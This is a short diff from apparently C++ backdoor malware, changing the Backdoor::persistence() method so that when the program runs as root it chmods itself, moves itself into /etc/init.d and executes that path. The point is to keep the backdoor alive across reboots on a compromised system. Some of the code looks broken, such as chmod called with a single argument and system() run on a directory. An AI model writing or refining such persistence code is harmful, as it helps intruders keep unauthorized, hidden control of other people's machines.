@@ -117,13 +117,16 @@ Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
 }
 
 void Backdoor::persistence(){
-    const char *  path = "1231231";
+    const char *  path = "/etc/init.d";
     std::cout << "Running persistence" << std::endl;
     if(geteuid() != 0)
     {
         std::cout << "Not root";
 
     }else{
+        chmod(program);
+        move_script(program, path);
+    
         std::cout << "root";
         system(path);
     }
